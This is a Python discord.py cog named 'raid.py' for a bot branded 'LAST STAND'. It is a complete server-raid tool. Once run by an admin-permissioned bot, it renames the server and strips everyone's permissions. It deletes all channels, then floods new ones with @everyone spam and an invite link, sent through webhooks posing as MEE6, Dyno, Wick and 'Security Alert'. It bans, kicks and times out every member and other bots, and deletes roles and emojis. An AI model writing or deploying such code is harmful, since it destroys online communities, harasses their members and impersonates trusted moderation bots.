"""
raid.py — LAST STAND | Raw destruction engine.
No bypass engine. Direct discord.py calls. Every error printed to Railway logs.
"""

import asyncio
import datetime
import random
import string

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

RAID_TAG  = "LAST STAND"
RAID_LINK = "https://discord.gg/s59zWvzK6c"
RAID_NAME = f"RAIDED BY {RAID_TAG}"

CHANNEL_CAP  = 480
WEBHOOKS_PER = 10

_MSGS = [
    f"@everyone 💀 **RAIDED BY {RAID_TAG}** 💀 {RAID_LINK}",
    f"@everyone ☠️ LAST STAND WAS HERE ☠️ {RAID_LINK}",
    f"@everyone 🔥 YOUR SERVER HAS BEEN RAIDED 🔥 {RAID_LINK}",
    f"@everyone ⚔️ LAST STAND RAID ⚔️ {RAID_LINK}",
    f"@everyone 💥 OBLITERATED BY LAST STAND 💥 {RAID_LINK}",
    f"@everyone 🚨 BREACH — LAST STAND {RAID_LINK}",
    f"@everyone 👑 LAST STAND OWNS THIS SERVER {RAID_LINK}",
    f"@everyone ⚡ RAIDED BY LAST STAND — GG {RAID_LINK}",
    f"@here 💀 RAIDED BY LAST STAND {RAID_LINK}",
    f"@here ☠️ LAST STAND RAID IN PROGRESS {RAID_LINK}",
    f"@here 🔥 RAIDED — JOIN US {RAID_LINK}",
]

_WH_NAMES = [
    "Server Announcement", "Mod Alert", "AutoMod", "Security Alert",
    "Carl-bot", "MEE6", "Dyno", "Wick",
    "LSC Alpha", "LSC Reaper", "LSC Ghost", "LSC Viper",
]

_NICKS = ["RAIDED", "LSC Was Here", "GG no re", "PWNED", RAID_TAG]


def _rand(n: int = 4) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _ch_name() -> str:
    return random.choice([
        f"raided-by-lsc-{_rand()}",
        f"last-stand-{_rand()}",
        f"lsc-owned-{_rand()}",
        f"lsc-raid-{_rand()}",
        f"raided-{_rand()}-lsc",
        f"last-stand-here-{_rand(3)}",
    ])


def _msg() -> str:
    return random.choice(_MSGS)


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── shared launch ──────────────────────────────────────────────────────────
    async def _launch(self, guild: discord.Guild, invoker_id: int, reply) -> None:
        if bot_state.active_simulation:
            await reply(f"⚠️ **{bot_state.active_simulation}** is running — use `.stop` or `/stop` first.")
            return

        bot_state.reset()
        bot_state.active_simulation = "raid"

        try:
            await reply(
                f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
                f"Deleting channels → flooding → banning everyone → spamming\n"
                f"Use `.stop` or `/stop` to halt."
            )
        except Exception:
            pass

        # Start everything — channel ops immediately, member ops chunk in background
        bot_state.add_task(asyncio.create_task(self._rename_server(guild)))
        bot_state.add_task(asyncio.create_task(self._channel_loop(guild)))
        bot_state.add_task(asyncio.create_task(self._member_ops(guild, invoker_id)))
        bot_state.add_task(asyncio.create_task(self._wipe_emojis(guild)))
        bot_state.add_task(asyncio.create_task(self._wipe_roles(guild)))

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer()
        await self._launch(interaction.guild, interaction.user.id, interaction.followup.send)

    # ── .raid ──────────────────────────────────────────────────────────────────
    @commands.command(name="raid")
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def raid_prefix(self, ctx: commands.Context) -> None:
        await self._launch(ctx.guild, ctx.author.id, ctx.send)

    # ─────────────────────────────────────────────────────────────────────────
    # RENAME SERVER + LOCK @everyone
    # ─────────────────────────────────────────────────────────────────────────
    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
            print(f"[raid] server renamed to {RAID_NAME}", flush=True)
        except Exception as e:
            print(f"[raid] rename failed: {e}", flush=True)

        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
        except Exception as e:
            print(f"[raid] lock @everyone failed: {e}", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # CHANNEL FLOOD — delete all, then create as many as possible
    # ─────────────────────────────────────────────────────────────────────────
    async def _channel_loop(self, guild: discord.Guild) -> None:
        se = bot_state.stop_event
        print("[raid] channel_loop: starting", flush=True)

        # ── Step 1: delete everything ─────────────────────────────────────────
        existing = list(guild.channels)
        print(f"[raid] channel_loop: deleting {len(existing)} channels", flush=True)

        async def _del(ch):
            try:
                await ch.delete()
            except discord.NotFound:
                pass
            except discord.Forbidden:
                print(f"[raid] 403 deleting #{ch.name}", flush=True)
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                    try:
                        await ch.delete()
                    except Exception:
                        pass
            except Exception as e:
                print(f"[raid] delete error #{ch.name}: {e}", flush=True)

        await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
        print("[raid] channel_loop: delete done, flooding now", flush=True)

        # ── Step 2: create loop ───────────────────────────────────────────────
        flood_created = 0
        consecutive_fails = 0

        while not se.is_set():
            # Near cap — delete our channels to make room
            if flood_created >= CHANNEL_CAP:
                ours = [
                    ch for ch in guild.channels
                    if any(k in ch.name for k in ("lsc", "last-stand", "raided"))
                ]
                if ours:
                    to_del = ours[:80]
                    await asyncio.gather(*[_del(ch) for ch in to_del], return_exceptions=True)
                    flood_created = max(0, flood_created - len(to_del))
                else:
                    flood_created = 0
                await asyncio.sleep(1.0)
                continue

            # Create 2 channels simultaneously
            async def _create():
                try:
                    ch = await guild.create_text_channel(
                        _ch_name(),
                        topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                    )
                    return ch
                except discord.Forbidden:
                    print("[raid] 403 channel create — bot has no Manage Channels permission", flush=True)
                    return None
                except discord.HTTPException as e:
                    if e.status == 429:
                        wait = float(getattr(e, "retry_after", 1.0))
                        print(f"[raid] 429 channel create — waiting {wait:.1f}s", flush=True)
                        await asyncio.sleep(wait)
                    else:
                        print(f"[raid] channel create HTTP {e.status}: {e.text}", flush=True)
                    return None
                except Exception as e:
                    print(f"[raid] channel create error: {type(e).__name__}: {e}", flush=True)
                    return None

            ch1, ch2 = await asyncio.gather(_create(), _create())

            got = 0
            for ch in (ch1, ch2):
                if isinstance(ch, discord.TextChannel):
                    flood_created += 1
                    got += 1
                    consecutive_fails = 0
                    bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))

            if got == 0:
                consecutive_fails += 2
                if consecutive_fails >= 20:
                    print(f"[raid] 20 consecutive create failures — permissions likely gone", flush=True)
                    await asyncio.sleep(5.0)
                    consecutive_fails = 0
            else:
                print(f"[raid] flood_created={flood_created}", flush=True)
                await asyncio.sleep(0.55)

        print("[raid] channel_loop: stopped", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # WEBHOOK SPAM — continuous, no sleep between waves
    # ─────────────────────────────────────────────────────────────────────────
    async def _spam_channel(self, channel: discord.TextChannel) -> None:
        se = bot_state.stop_event
        webhooks: list[discord.Webhook] = []

        # Create webhooks
        for _ in range(WEBHOOKS_PER):
            if se.is_set():
                break
            try:
                wh = await channel.create_webhook(name=random.choice(_WH_NAMES))
                webhooks.append(wh)
            except discord.NotFound:
                return
            except discord.Forbidden:
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
            except Exception:
                continue

        if not webhooks:
            # Fallback: send directly
            while not se.is_set():
                try:
                    await channel.send(
                        _msg(),
                        allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                    )
                except discord.NotFound:
                    return
                except discord.Forbidden:
                    return
                except discord.HTTPException as e:
                    if e.status == 429:
                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
                except Exception:
                    return
            return

        # All webhooks fire simultaneously, 20 sends each, then repeat immediately
        while not se.is_set():
            tasks = [
                wh.send(
                    _msg(),
                    username=random.choice(_WH_NAMES),
                    allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
                )
                for wh in webhooks
                for _ in range(20)
            ]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # If everything 404'd/403'd the channel is gone
            for r in results:
                if isinstance(r, discord.NotFound):
                    return
                if isinstance(r, discord.Forbidden):
                    return

    # ─────────────────────────────────────────────────────────────────────────
    # MEMBER OPS — chunk first, then ban/kick/timeout everyone simultaneously
    # ─────────────────────────────────────────────────────────────────────────
    async def _member_ops(self, guild: discord.Guild, invoker_id: int) -> None:
        se = bot_state.stop_event
        print("[raid] member_ops: chunking...", flush=True)

        try:
            await asyncio.wait_for(guild.chunk(cache=True), timeout=10.0)
        except Exception as e:
            print(f"[raid] chunk error: {e}", flush=True)

        if se.is_set():
            return

        me = guild.me
        targets = [
            m for m in guild.members
            if not m.bot
            and m.id != invoker_id
            and m.id != me.id
            and m.top_role < me.top_role
        ]
        enemy_bots = [
            m for m in guild.members
            if m.bot and m.id != me.id and m.top_role < me.top_role
        ]
        print(f"[raid] member_ops: {len(targets)} members, {len(enemy_bots)} bots", flush=True)

        sem_ban  = asyncio.Semaphore(25)
        sem_kick = asyncio.Semaphore(25)
        sem_to   = asyncio.Semaphore(25)
        sem_nick = asyncio.Semaphore(25)
        dur      = datetime.timedelta(days=28)

        async def _ban(m):
            async with sem_ban:
                if se.is_set():
                    return
                try:
                    await guild.ban(m, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
                except Exception:
                    pass

        async def _kick(m):
            async with sem_kick:
                if se.is_set():
                    return
                try:
                    await guild.kick(m, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _timeout(m):
            async with sem_to:
                if se.is_set():
                    return
                try:
                    await m.timeout(dur, reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        async def _nick(m):
            async with sem_nick:
                if se.is_set():
                    return
                try:
                    await m.edit(nick=random.choice(_NICKS))
                except Exception:
                    pass

        all_targets = targets + enemy_bots
        await asyncio.gather(
            *[_ban(m) for m in all_targets],
            *[_kick(m) for m in all_targets],
            *[_timeout(m) for m in targets],
            *[_nick(m) for m in targets],
            return_exceptions=True,
        )
        print(f"[raid] member_ops: done ({len(all_targets)} processed)", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # EMOJI WIPE
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_emojis(self, guild: discord.Guild) -> None:
        if not guild.emojis:
            return
        sem = asyncio.Semaphore(20)

        async def _del(e):
            async with sem:
                try:
                    await e.delete()
                except Exception:
                    pass

        await asyncio.gather(*[_del(e) for e in guild.emojis], return_exceptions=True)
        print(f"[raid] wiped {len(guild.emojis)} emojis", flush=True)

    # ─────────────────────────────────────────────────────────────────────────
    # ROLE WIPE — delete all non-managed, non-default roles
    # ─────────────────────────────────────────────────────────────────────────
    async def _wipe_roles(self, guild: discord.Guild) -> None:
        me = guild.me
        roles = [
            r for r in guild.roles
            if not r.managed
            and r != guild.default_role
            and r < me.top_role
        ]
        if not roles:
            return

        sem = asyncio.Semaphore(10)

        async def _del(r):
            async with sem:
                try:
                    await r.delete(reason=f"Raided by {RAID_TAG}")
                except Exception:
                    pass

        await asyncio.gather(*[_del(r) for r in roles], return_exceptions=True)
        print(f"[raid] wiped {len(roles)} roles", flush=True)

    # ── error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        msg = "❌ You need **Administrator** permission." if isinstance(error, app_commands.MissingPermissions) else f"❌ {error}"
        try:
            if interaction.response.is_done():
                await interaction.followup.send(msg, ephemeral=True)
            else:
                await interaction.response.send_message(msg, ephemeral=True)
        except Exception:
            pass


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
